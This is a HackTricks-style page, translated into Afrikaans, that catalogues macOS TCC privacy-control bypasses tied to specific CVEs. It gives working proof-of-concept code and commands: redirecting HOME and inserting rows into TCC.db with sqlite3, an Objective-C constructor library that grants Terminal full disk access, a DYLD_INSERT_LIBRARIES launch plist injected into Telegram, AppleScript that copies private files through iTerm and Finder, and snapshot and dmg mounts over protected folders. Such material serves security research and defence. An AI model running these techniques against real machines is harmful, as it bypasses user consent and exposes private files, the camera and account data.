# macOS TCC Deurloop

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Volgens funksionaliteit

### Skryf Deurloop

Dit is nie 'n deurloop nie, dit is net hoe TCC werk: **Dit beskerm nie teen skryf nie**. As Terminal **nie toegang het om die blad van 'n gebruiker te lees nie, kan dit steeds daarin skryf**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Die **uitgebreide kenmerk `com.apple.macl`** word by die nuwe **lêer** gevoeg om die **skeppersprogram** toegang te gee om dit te lees.

### SSH Oorspring

Standaard het toegang via **SSH "Volle Skyf Toegang"** gehad. Om dit uit te skakel, moet jy dit gelys hê maar gedeaktiveer hê (om dit uit die lys te verwyder, sal nie daardie voorregte verwyder nie):

![](<../../../../../.gitbook/assets/image (569).png>)

Hier kan jy voorbeelde vind van hoe sommige **malware hierdie beskerming kon omseil**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Let daarop dat jy nou, om SSH te kan aktiveer, **Volle Skyf Toegang** nodig het.
{% endhint %}

### Hanteer uitbreidings - CVE-2022-26767

Die kenmerk **`com.apple.macl`** word aan lêers gegee om 'n **sekere toepassing toestemmings te gee om dit te lees**. Hierdie kenmerk word ingestel wanneer 'n lêer oor 'n toepassing **gesleep en laat val** word, of wanneer 'n gebruiker 'n lêer **dubbelklik** om dit met die **standaard toepassing** oop te maak.

Daarom kan 'n gebruiker 'n kwaadwillige toepassing **registreer om alle uitbreidings te hanteer** en Launch Services roep om enige lêer oop te maak (sodat die kwaadwillige lêer toegang kry om dit te lees).

### iCloud

Met die toekenning **`com.apple.private.icloud-account-access`** is dit moontlik om met die **`com.apple.iCloudHelper`** XPC-diens te kommunikeer wat **iCloud-token** sal voorsien.

**iMovie** en **Garageband** het hierdie toekenning en ander wat toegelaat het.

Vir meer **inligting** oor die uitbuiting om **iCloud-tokens te kry** van daardie toekenning, kyk na die praatjie: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Outomatisering

'n Toepassing met die **`kTCCServiceAppleEvents`** toestemming sal in staat wees om **ander toepassings te beheer**. Dit beteken dat dit in staat kan wees om die toestemmings wat aan die ander toepassings verleen is, **te misbruik**.

Vir meer inligting oor Apple-skripte, kyk na:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Byvoorbeeld, as 'n toepassing **Outomatiseringstoestemming oor `iTerm`** het, het byvoorbeeld in hierdie voorbeeld **`Terminal`** toegang oor iTerm:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Oor iTerm

Terminal, wat nie FDA het nie, kan iTerm roep, wat dit wel het, en dit gebruik om aksies uit te voer:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Oor Finder

Of as 'n App toegang het tot Finder, kan dit 'n skripsie soos hierdie een wees:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Volgens App-gedrag

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Die gebruikersruimte **tccd daemon** wat die **`HOME`** **env** veranderlike gebruik om toegang te verkry tot die TCC-gebruikersdatabasis vanaf: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Volgens [hierdie Stack Exchange-pos](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) en omdat die TCC daemon via `launchd` in die huidige gebruiker se domein loop, is dit moontlik om **alle omgewingsveranderlikes** wat aan dit oorgedra word, te **beheer**.\
Dus kan 'n **aanvaller die `$HOME`-omgewingsveranderlike** in **`launchctl`** instel om na 'n **beheerde gids** te verwys, die **TCC** daemon herlaai, en dan die **TCC-databasis direk wysig** om homself **elke TCC-bevoegdheid beskikbaar** te gee sonder om die eindgebruiker ooit te vra om toestemming.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notas

Notas het toegang tot TCC-beskermde liggings, maar wanneer 'n nota geskep word, word dit **geskep in 'n nie-beskermde ligging**. Jy kan dus notas vra om 'n beskermde lêer in 'n nota te kopieer (dus in 'n nie-beskermde ligging) en dan toegang tot die lêer te verkry:

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translokasie

Die binaêre `/usr/libexec/lsd` met die biblioteek `libsecurity_translocate` het die toekenning `com.apple.private.nullfs_allow` gehad wat dit toegelaat het om 'n **nullfs**-koppelpunt te skep en het die toekenning `com.apple.private.tcc.allow` gehad met **`kTCCServiceSystemPolicyAllFiles`** om toegang tot elke lêer te verkry.

Dit was moontlik om die karantynatribuut by "Library" te voeg, die **`com.apple.security.translocation`** XPC-diens te roep en dan sou dit Library na **`$TMPDIR/AppTranslocation/d/d/Library`** in kaart bring waar al die dokumente binne Library **toeganklik** sou wees.

### CVE-2023-38571 - Musiek & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Musiek`** het 'n interessante funksie: Wanneer dit loop, sal dit die lêers wat in **`~/Musiek/Musiek/Media.localized/Automatically Add to Music.localized`** gelaai word, in die gebruiker se "medialêer" **importe**. Verder roep dit iets soos: **`hernoem(a, b);`** waar `a` en `b` is:

* `a = "~/Musiek/Musiek/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Musiek/Musiek/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

Hierdie **`hernoem(a, b);`**-gedrag is vatbaar vir 'n **Race Condition**, aangesien dit moontlik is om 'n vals **TCC.db**-lêer binne die `Automatically Add to Music.localized`-vouer te plaas en dan wanneer die nuwe vouer(b) geskep word om die lêer te kopieer, dit te verwyder en dit te verwys na **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

As **`SQLITE_SQLLOG_DIR="pad/vouer"`** ingestel is, beteken dit basies dat **enige oop db na daardie pad gekopieer word**. In hierdie CVE is hierdie beheer misbruik om binne 'n **SQLite-databasis te skryf** wat deur 'n proses met FDA die TCC-databasis oopgemaak gaan word, en dan **`SQLITE_SQLLOG_DIR`** te misbruik met 'n **symboliese skakel in die lêernaam** sodat wanneer daardie databasis **oopgemaak** word, die gebruiker se **TCC.db oorskryf** word met die geopende een.\
**Meer inligting** [**in die writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **en**[ **in die praatjie**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

As die omgewingsveranderlike **`SQLITE_AUTO_TRACE`** ingestel is, sal die biblioteek **`libsqlite3.dylib`** begin om alle SQL-navrae te **log**. Baie toepassings het hierdie biblioteek gebruik, dus was dit moontlik om al hul SQLite-navrae te log.

Verskeie Apple-toepassings het hierdie biblioteek gebruik om toegang tot TCC-beskermde inligting te verkry.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

Hierdie **omgewingsveranderlike word deur die `Metal` raamwerk gebruik**, wat 'n afhanklikheid is van verskeie programme, veral `Music`, wat FDA het.

Stel die volgende in: `MTL_DUMP_PIPELINES_TO_JSON_FILE="pad/naam"`. As `pad` 'n geldige gids is, sal die fout geaktiveer word en kan ons `fs_usage` gebruik om te sien wat in die program aangaan:

* 'n lêer genaamd `pad/.dat.nosyncXXXX.XXXXXX` (X is willekeurig) sal `open()` word
* een of meer `write()`-oproepe sal die inhoud na die lêer skryf (ons beheer dit nie)
* `pad/.dat.nosyncXXXX.XXXXXX` sal hernoem word na `pad/naam`

Dit is 'n tydelike lêer skryf, gevolg deur 'n **`rename(oud, nuut)`** **wat nie veilig is nie**.

Dit is nie veilig nie omdat dit die ou en nuwe paaie afsonderlik moet **oplos**, wat tyd kan neem en vatbaar kan wees vir 'n Race Condition. Vir meer inligting kan jy die `xnu`-funksie `renameat_internal()` raadpleeg.

{% hint style="danger" %}
Dus, as 'n bevoorregte proses van 'n gids wat jy beheer hernoem, kan jy 'n RCE wen en dit laat toegang gee tot 'n ander lêer of, soos in hierdie CVE, die lêer wat deur die bevoorregte toepassing geskep is, oopmaak en 'n FD stoor.

As die hernoeming 'n gids wat jy beheer, terwyl jy die bronlêer gewysig het of 'n FD daarvoor het, toegang gee, kan jy die bestemmingslêer (of -gids) verander om na 'n simbooliese skakel te wys, sodat jy kan skryf wanneer jy wil.
{% endhint %}

Dit was die aanval in die CVE: Byvoorbeeld, om die gebruiker se `TCC.db` te oorskryf, kan ons:

* skep `/Gebruikers/hacker/onskakel` om na `/Gebruikers/hacker/Biblioteek/Application Support/com.apple.TCC/` te wys
* skep die gids `/Gebruikers/hacker/tmp/`
* stel `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Gebruikers/hacker/tmp/TCC.db` in
* aktiveer die fout deur `Music` met hierdie omgewingsveranderlike uit te voer
* vang die `open()` van `/Gebruikers/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X is willekeurig)
* hier open ons ook hierdie lêer vir skryf, en hou die lêerbeskrywer vas
* skakel atomies tussen `/Gebruikers/hacker/tmp` en `/Gebruikers/hacker/onskakel` **in 'n lus**
* ons doen dit om ons kanse om te slaag te maksimeer, aangesien die wedrenvenster baie smal is, maar om die wedren te verloor het verwaarloosbare nadele
* wag 'n bietjie
* toets of ons gelukkig was
* as nie, voer weer van bo af uit

Meer inligting in [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
Nou, as jy probeer om die omgewingsveranderlike `MTL_DUMP_PIPELINES_TO_JSON_FILE` te gebruik, sal programme nie begin nie.
{% endhint %}

### Apple Remote Desktop

As root kan jy hierdie diens aktiveer en die **ARD-agent sal volle skryftoegang** hê wat dan deur 'n gebruiker misbruik kan word om dit te laat 'n nuwe **TCC-gebruikersdatabasis** kopieer.

## Deur **NFSHomeDirectory**

TCC gebruik 'n databasis in die gebruiker se TUIS-gids om toegang tot hulpbronne wat spesifiek is vir die gebruiker te beheer by **$HOME/Biblioteek/Application Support/com.apple.TCC/TCC.db**.\
Daarom, as die gebruiker daarin slaag om TCC te herlaai met 'n $HOME-omgewingsveranderlike wat na 'n **ander gids wys**, kan die gebruiker 'n nuwe TCC-databasis skep in **/Biblioteek/Application Support/com.apple.TCC/TCC.db** en TCC mislei om enige TCC-toestemming aan enige toepassing toe te ken.

{% hint style="success" %}
Let daarop dat Apple die instelling wat binne die gebruiker se profiel in die **`NFSHomeDirectory`**-eienskap gestoor word, gebruik as die waarde van `$HOME`, sodat as jy 'n toepassing met toestemmings om hierdie waarde te wysig (**`kTCCServiceSystemPolicySysAdminFiles`**) kompromitteer, kan jy hierdie opsie met 'n TCC-omleiding **bewapen**.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Die **eerste POC** gebruik [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) en [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) om die **HOME**-gids van die gebruiker te wysig.

1. Kry 'n _csreq_-klont vir die teikenprogram.
2. Plant 'n vals _TCC.db_-lêer met vereiste toegang en die _csreq_-klont.
3. Voer die gebruiker se Directory Services-inskrywing uit met [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Wysig die Directory Services-inskrywing om die gebruiker se tuisgids te verander.
5. Voer die gewysigde Directory Services-inskrywing in met [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Stop die gebruiker se _tccd_ en herlaai die proses.

Die tweede POC het **`/usr/libexec/configd`** gebruik wat `com.apple.private.tcc.allow` met die waarde `kTCCServiceSystemPolicySysAdminFiles` gehad het.\
Dit was moontlik om **`configd`** met die **`-t`**-opsie uit te voer, waar 'n aanvaller 'n **aangepaste Bundel om te laai** kon spesifiseer. Daarom vervang die uitbuiting die **`dsexport`**- en **`dsimport`**-metode om die gebruiker se tuisgids te verander met 'n **`configd`-kode-inspuiting**.

Vir meer inligting, kyk na die [**oorspronklike verslag**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Deur proses-inspuiting

Daar is verskillende tegnieke om kode binne 'n proses in te spuit en sy TCC-voorregte te misbruik:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

Verder is die mees algemene proses-inspuiting om TCC te omseil via **inproppe (laai biblioteek)**.\
Inproppe is ekstra kode gewoonlik in die vorm van biblioteke of plist, wat deur die hooftoepassing **gelaai sal word** en onder sy konteks sal uitvoer. Daarom, as die hooftoepassing toegang tot TCC-beperkte lêers gehad het (via verleen toestemmings of toekennings), sal die **aangepaste kode dit ook hê**.

### CVE-2020-27937 - Directory Utility

Die toepassing `/System/Library/CoreServices/Applications/Directory Utility.app` het die toekennings **`kTCCServiceSystemPolicySysAdminFiles`** gehad, het inproppe met die **`.daplug`**-uitbreiding gelaai en het nie die geharde uitvoering gehad nie.

Om hierdie CVE te bewapen, word die **`NFSHomeDirectory`** verander (deur die vorige toekennings te misbruik) om in staat te wees om die gebruiker se TCC-databasis oor te neem om TCC te omseil.

Vir meer inligting, kyk na die [**oorspronklike verslag**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).
### CVE-2020-29621 - Coreaudiod

Die binaire **`/usr/sbin/coreaudiod`** het die entitlements `com.apple.security.cs.disable-library-validation` en `com.apple.private.tcc.manager`. Die eerste **laat kode-inspuiting toe** en die tweede gee dit toegang om **TCC te bestuur**.

Hierdie binaire het toegelaat dat **derde party invoegtoepassings** van die folder `/Library/Audio/Plug-Ins/HAL` gelaai word. Daarom was dit moontlik om **'n invoegtoepassing te laai en die TCC-permissies te misbruik** met hierdie PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Vir meer inligting, kyk na die [**oorspronklike verslag**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Toestel Abstraksie Laag (DAL) Inproppe

Stelseltoepassings wat kamera-stroom oopmaak via Core Media I/O (toepassings met **`kTCCServiceCamera`**) laai **in die proses hierdie inproppe** wat in `/Library/CoreMediaIO/Plug-Ins/DAL` geleë is (nie SIP-beperk nie).

Net die stoor van 'n biblioteek met die algemene **konstrukteur** sal werk om kode in te spuit.

Verskeie Apple-toepassings was vatbaar hiervoor.

### Firefox

Die Firefox-toepassing het die `com.apple.security.cs.disable-library-validation` en `com.apple.security.cs.allow-dyld-environment-variables` toestemmings gehad:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Vir meer inligting oor hoe om hierdie [**oorspronklike verslag te ondersoek**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Die binêre lêer `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` het die toekennings **`com.apple.private.tcc.allow`** en **`com.apple.security.get-task-allow`** gehad, wat dit moontlik gemaak het om kode in die proses in te spuit en die TCC-voorregte te gebruik.

### CVE-2023-26818 - Telegram

Telegram het die toekennings **`com.apple.security.cs.allow-dyld-environment-variables`** en **`com.apple.security.cs.disable-library-validation`** gehad, sodat dit moontlik was om dit te misbruik om toegang tot sy toestemmings te kry, soos opname met die kamera. Jy kan [**die nutslading in die skryfstuk vind**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Let op hoe die omgewingsveranderlike gebruik word om 'n biblioteek te laai, 'n **aangepaste plist** is geskep om hierdie biblioteek in te spuit en **`launchctl`** is gebruik om dit te begin:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Deur oop aanroepings

Dit is moontlik om **`open`** te roep selfs terwyl jy in 'n sandboks is.

### Terminal Skripte

Dit is baie algemeen om terminal **Volle Skyftoegang (FDA)** te gee, ten minste in rekenaars wat deur tegniese mense gebruik word. En dit is moontlik om **`.terminal`** skripte te roep deur dit te gebruik.

**`.terminal`** skripte is plist-lêers soos hierdie een met die bevel om uit te voer in die **`CommandString`** sleutel:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
'n Toepassing kan 'n terminale skrip skryf in 'n plek soos /tmp en dit met 'n opdrag soos die volgende uitvoer:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Deur te monteer

### CVE-2020-9771 - mount\_apfs TCC omseiling en voorregverhoging

**Enige gebruiker** (selfs onbevoorregte gebruikers) kan 'n tydmasjien-snapshot skep en monteer en **ALLE lêers** van daardie snapshot toegang verkry.\
Die **enigste voorregte** wat nodig is, is dat die gebruikte toepassing (soos `Terminal`) **Volle Skyf Toegang** (FDA) toegang (`kTCCServiceSystemPolicyAllfiles`) moet hê wat deur 'n administrateur verleen moet word.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

'n Meer gedetailleerde verduideliking kan in die oorspronklike verslag gevind word.

### CVE-2021-1784 & CVE-2021-30808 - Monteer oor TCC-lêer

Selfs al is die TCC DB-lêer beskerm, was dit moontlik om 'n nuwe TCC.db-lêer oor die gids te monteer:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Kyk na die **volledige uitbuiting** in die [**oorspronklike skryfstuk**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

Die instrument **`/usr/sbin/asr`** het dit moontlik gemaak om die hele skyf te kopieer en dit op 'n ander plek te monteer deur TCC-beskerming te omseil.

### Liggingdienste

Daar is 'n derde TCC-databasis in **`/var/db/locationd/clients.plist`** om kliënte aan te dui wat toegang het tot **liggingdienste**.\
Die **`/var/db/locationd/`-vouer was nie beskerm teen DMG-montasie nie** sodat dit moontlik was om ons eie plist te monteer.

## Deur opstarttoepassings

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## Deur grep

In verskeie gevalle sal lêers sensitiewe inligting soos e-posse, telefoonnommers, boodskappe... in nie-beskermde liggings stoor (wat as 'n kwesbaarheid in Apple tel).

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## Sintetiese kliek

Dit werk nie meer nie, maar dit [**het in die verlede gewerk**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

'n Ander manier om [**CoreGraphics-gebeure**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf) te gebruik:

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## Verwysing

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Maniere om Jou macOS-privasiemeganismes te Omseil**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Wen Teen TCC - 20+ NUWE Maniere om Jou MacOS-privasiemeganismes te Omseil**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**SUBSKRIPSIEPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
